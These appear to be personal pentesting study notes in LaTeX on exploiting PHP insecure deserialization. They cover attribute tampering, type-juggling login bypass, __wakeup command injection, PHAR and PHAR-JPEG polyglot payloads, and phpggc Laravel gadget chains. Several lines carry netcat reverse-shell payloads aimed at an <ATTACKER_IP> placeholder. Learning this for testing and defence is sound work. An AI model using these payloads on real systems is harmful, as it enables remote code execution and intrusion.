\section{PHP}
\subsection{Serialization Format and functions}

The syntax generally follows the pattern of one-letter code of the variable
type, followed by a colon, followed by the variable value, followed by a
semicolon.

\begin{verbatim}
Null 	N;
Boolean 	    b:1;
                b:0;
Integer 	    i:685230;
                i:-685230;
Floating point 	d:685230.15;
                d:INF;
                d:-INF;
                d:NAN;
String 	        s:5:"apple";
                s:6:"A to Z";
Asso array 	    a:4:{i:0;b:1;i:1;N;i:2;d:-421000000;i:3;s:6:"A to Z";}
                a:2:{i:42;b:1;s:6:"A to Z";a:3:{i:0;i:1;i:1;i:2;i:2;i:3;}}
Object 	        O:8:"stdClass":2:{s:4:"John";d:3.14;s:4:"Jane";d:2.718;}
\end{verbatim}

The native methods for PHP serialization are \verb+serialize()+ and
\verb+unserialize()+. 

\subsection{Attributes modification}

either directly edit the serialized data or construct a code with an object
that represent the sirialized data and implement serialization deserialisation.

\begin{verbatim}
cho -n TzoyNDoiQXBwXEhlbHBlcnNcVXNl...SNIP... | base64 -d

O:24:"App\Helpers\UserSettings":4:{s:30:"App\Helpers\UserSettingsName";s:7:"pentest";s:31:"App\Helpers\UserSettingsEmail";s:16:"pentest@test.com";s:34:"App\Helpers\UserSettingsPassword";s:60:"$2y$10$kPfp572LjEN1HDYrBOoWqezWZcee58HteiIStVvRu6ndWimUqBN7a";s:36:"App\Helpers\UserSettingsProfilePic";s:11:"default.jpg";}
\end{verbatim}


\begin{verbatim}
<?php
namespace App\Helpers;

class UserSettings {
    private $Name;
    private $Email;
    private $Password;
    private $ProfilePic;
    public function __construct($Name, $Email, $Password, $ProfilePic) {
        $this->setName($Name);
        $this->setEmail($Email);
        $this->setPassword($Password);
        $this->setProfilePic($ProfilePic);
    }
    public function print(){
        print("\n");
        print('$this->name        = ' . $this->getName() . "\n");
        print('$this->email       = ' . $this->getEmail() . "\n");
        print('$this->password    = ' . $this->getPassword() . "\n");
        print('$this->profile_pic = ' . $this->getProfilePic() . "\n");
        print("\n");
    }
};

echo base64_encode(serialize(new UserSettings('pentest', 'attacker@htbank.com', '$2y$10$u5o6u2EbjOmobQjVtu87QO8ZwQsDd2zzoqjwS0.5zuPr3hqk9wfda', 'default.jpg')));

$user = XXXXX;
$userSettings = unserialize(base64_decode($user));

<.. . SNIP. ..>

echo base64_encode(serialize($userSettings));
\end{verbatim}

\subsection{Modifying data types}
PHP-based logic is particularly vulnerable to this kind of manipulation due to
the behavior of its loose comparison operator (\verb+==+) when comparing
different data types. For example, if you perform a loose comparison between an
integer and a string, PHP will attempt to convert the string to an integer,
meaning that \verb+5 == "5"+ evaluates to \verb+true+.

Unusually, this also works for any alphanumeric string that starts with a
number. In this case, PHP will effectively convert the entire string to an
integer value based on the initial number. The rest of the string is ignored
completely. Therefore, \verb+5 == "5 of something"+ is in practice treated as
\verb+5 == 5+. 

moreover \verb+0 == "Example string"+ is  \verb+true+

this allow to perform attack on login forms such as:
\begin{verbatim}
$login = unserialize($_COOKIE)
if ($login['password'] == $password) {
// log in successfully
}
\end{verbatim}

providing a serialized object which password is an integer with value 0 will
log successfully.


\subsection{Magic methods}

\href{https://www.php.net/manual/en/language.oop5.magic.php}{PHP Magic methods}

\verb+__wakeup+ 	Called when deserializing an object. If
\verb+__unserialize+ and \verb+__wakeup+ are defined, the latter is ignored.
E.g. \verb+unserialize($ser_obj)+

considering the following code:
\begin{verbatim}
    public function __wakeup() {
        shell_exec('echo "$(date +\'[%d.%m.%Y %H:%M:%S]\') Imported settings for user \'' . $this->getName() . '\'" >> /tmp/htbank.log');
    }
\end{verbatim}

it isq possible to provide a username that will allow RCE.

\begin{verbatim}
'"; nc -nv <ATTACKER_IP> 9999 -e /bin/bash;#'
\end{verbatim}

\subsection{Phar Deserialization}

\href{PHAR is an extension to PHP which provides a way to put entire PHP
applications into an "archive" similar to a JAR file for Java.}{PHAR} is an
extension to PHP which provides a way to put entire PHP applications into an
"archive" similar to a JAR file for Java.

PHP provides several URL-style wrappers that you can use for handling different
protocols when accessing file paths. One of these is the \verb+phar://+
wrapper, which provides a stream interface for accessing PHP Archive
(\verb+.phar+) files. it allow to access files inside an archive using
\verb+phar:///path/to/myphar.phar/file.php+.

The PHP documentation reveals that {\bf PHAR manifest files contain serialized
metadata}. When {\bf performing any filesystem operations on a \verb+phar://+
stream, this metadata is implicitly deserialized (until PHP 8.0)}. This means that a
\verb+phar://+ stream can potentially be a vector for exploiting insecure
deserialization, provided that you can pass this stream into a filesystem
method. 

In the case of obviously dangerous filesystem methods, such as \verb+include()+
or \verb+fopen()+, websites are likely to have implemented counter-measures to
reduce the potential for them to be used maliciously. However, methods such as
\verb+file_exists()+, which are not so overtly dangerous, may not be as well protected. 

This {\bf technique also requires to upload the PHAR to the server} somehow.

\subsection{Exploiting PHAR Deserialization}

\begin{verbatim}
<?php

$malicious = new Malicious();

$phar = new Phar("exploit.phar");

$phar->startBuffering();

$phar->addFromString('0', '');
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($malicious);

$phar->stopBuffering();
\end{verbatim}

to create a polyglot pharjpeg it is possible to use the following instruction:
\begin{verbatim}
$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");
\end{verbatim}


\url{https://github.com/kunte0/phar-jpg-polyglot/blob/master/phar_jpg_polyglot.php}


In case of error  modify \verb+/etc/php/X.Y/cli/php.ini+:
\begin{verbatim}
[Phar]
; phar.readonly = On
phar.readonly = Off
\end{verbatim}




For more info
\href{https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf}{File
Operation Induced Unserialization via the phar Stream Wrapper}


\subsection{PHP Generic Gadget Chains}

\begin{verbatim}
$ phpggc -l Laravel

Gadget Chains
-------------

NAME             VERSION            TYPE                   VECTOR        I    
Laravel/RCE1     5.4.27             RCE (Function call)    __destruct         
Laravel/RCE10    5.6.0 <= 9.1.8+    RCE (Function call)    __toString         
Laravel/RCE2     5.4.0 <= 8.6.9+    RCE (Function call)    __destruct         
Laravel/RCE3     5.5.0 <= 5.8.35    RCE (Function call)    __destruct    *    
Laravel/RCE4     5.4.0 <= 8.6.9+    RCE (Function call)    __destruct         
Laravel/RCE5     5.8.30             RCE (PHP code)         __destruct    *    
Laravel/RCE6     5.5.* <= 5.8.35    RCE (PHP code)         __destruct    *    
Laravel/RCE7     ? <= 8.16.1        RCE (Function call)    __destruct    *    
Laravel/RCE8     7.0.0 <= 8.6.9+    RCE (Function call)    __destruct    *    
Laravel/RCE9     5.4.0 <= 9.1.8+    RCE (Function call)    __destruct         
\end{verbatim}

\begin{verbatim}
$ phpggc Laravel/RCE9 system 'nc -nv <ATTACKER_IP> 9999 -e /bin/bash' -b
Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2...SNIP...Jhc2giO319
\end{verbatim}

\begin{verbatim}
phpggc -p phar Laravel/RCE9 system 'nc -nv <ATTACKER_IP> 9999 -e /bin/bash' -o exploit.phar
\end{verbatim}
